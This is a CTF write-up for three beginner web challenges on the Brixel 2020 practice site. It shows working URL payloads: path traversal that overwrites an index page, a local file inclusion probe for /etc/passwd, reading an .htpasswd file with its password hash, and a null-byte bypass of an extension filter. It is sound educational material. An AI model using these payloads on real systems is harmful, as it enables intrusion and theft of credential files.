# 2020 Brixel CTF

Week long beginner friendly ctf taking place December 2020

## Overview


## Internet 15: Dadjokes

**Challenge**

Darn! Some idiot scriptkiddy broke my favorite website full of dad jokes!

I can't seem to contact the owner to fix the site

Can you bring it back and remove the defaced page?

**Solution**

The link takes you to a site that has clearly been defaced. Looking at the source, there's a comment that says:
```html
<!-- Hey bozo! I left your original index file under index_backup.html so you can see how your site looked before I used my l33t skillz to deface it. -->
```
Navigating to /index_backup.html we find that we can submit a new dad joke, or read a dad joke.  Looking at the submit feature, it looks like it includes information about the joke that you are submitting in the URI.
```
http://timesink.be/dadjokes/jokes/submit.php?filename=test.txt&title=test&content=test
```
I was most interested in that filename parameter.  Changing that to test.php and then trying to submit gets a clue from the creator:
```
You're on the right track, but I'm not going to allow this in here, try that somewhere else!
```
So we can't create a php file and get code execution, but maybe this is how the attackers defaced the main page? I thought to try to change the filename to index.html
```
http://timesink.be/dadjokes/jokes/submit.php?filename=../index.html&title=test&content=test&submit=true
```
This results in a different hint from the creator:
```
You are definitely on the right track here... but what are you trying to accomplish?
```
Thinking back to the challenge, they wanted me to bring back the original dadjokes site. I thought that maybe I needed to include the source for the index_backup.html page. 
```
http://timesink.be/dadjokes/jokes/submit.php?filename=../index.html&title=test&content=%3Chtml%3E%3Ctitle%3EDadJokes,%20your%20source%20of%20lame%20dad%20jokes%3C/title%3E%3Cbody%3E%3Cdiv%20align=%22center%22%3E%3Ch1%3EDadJokes%3C/h1%3E%3Chr%3E%3Cimg%20src=%22images/banner.png%22%20alt=%22dadjokes%22%3E%3Cbr%3E%3Cbr%3E%3Ca%20href=%22jokes/read.php%22%3ERead%20dad%20jokes%3C/a%3E%3Cbr%3E%3Cbr%3E%3Ca%20href=%22jokes/submit.php%22%3Esubmit%20your%20own%20jokes%3C/a%3E%3C/div%3E%3C/html%3E&submit=true
```
That worked! We are given the flag after submitting that payload.

**Flag**

```
brixelCTF{lamejoke}
```

## Internet 15: Pathfinders #1
**Challenge**

These f*cking religious sects!

These guys brainwashed my niece into their demeted world of i-readings and other such nonsense.

The feds recently closed their churches, but it seems they are preparing for a new online platform to continue their malicious activities.

can you gain access to their admin panel to shut them down?

Their website is: http://timesink.be/pathfinder/

**Solution**

Navigating to the pathfinders homepage, it is immediately evident that the challenge is going to involve some sort of local file inclusion(LFI).  I assume this, because we have control over the page paremeter in the URL.  Using the members/locations links, the page paremeter changes to members.php and locations.php respectively.  
First thing I tried was to find the passwd file, just to see if there was a LFI vulnerability.
```
http://timesink.be/pathfinder/index.php?page=../../../../../../etc/passwd
```

This results in a hint from the creator, but I guess I'm on the wrong path
```
naughty, naughty! you're only supposed to go after stuff in admin! no back traversing!/
```

Based on that hint, I started trying to find files in the admin folder, starting with the index page for the admin portal:
```
http://timesink.be/pathfinder/index.php?page=admin/index.php
```
This looks like I'm on the right path, but not quite there:
```
There is nothing here! not even bonus points I'm afraid :( you should get the password, not the page.
```
So if I'm trying to find the password, I figured I should look for config files. I first thought I needed to brute force the admin directory, looking for a php file that would contain a password. However, while manually fuzzing the directory I found the solution
```
http://timesink.be/pathfinder/index.php?page=admin/.htpasswd
```


**Flag**

```
#normally you would brute force this, but that is not in scope of this challenge. The flag is: brixelCTF{unsafe_include}
admin:$apr1$941ydmlw$aPUW.gCFcvUbIcP0ptVQF0
```

## Internet 20: Pathfinders #2
**Challenge**

It seems they updated their security. can you get the password for their admin section on their new site?

http://timesink.be/pathfinder2/

oh yeah, let's assume they are running a php version below 5.3.4 here...

**Solution**

This page looks very similar to the previous pathfinder challenge, except there's a new warning at the bottom of the page
```
Due to a recent hacker intrusion, we upgraded our security to only allow for php files to be included.
```

Testing the solution to the previous challenge, we see that it's now filtering any file that doesn't have the '.php' extension
```
file not ending in .php, terminating.
```

Since they hinted that this site is running an outdated version of php, I thought to try including a null byte
```
http://timesink.be/pathfinder2/index.php?page=admin/.htpasswd%00
```
That still doesn't work, but tacking '.php' onto the end of the null byte gets us the flag!
```
http://timesink.be/pathfinder2/index.php?page=admin/.htpasswd%00.php
```

**Flag**

```
Great work! the flag is brixelCTF{outdated_php}
```
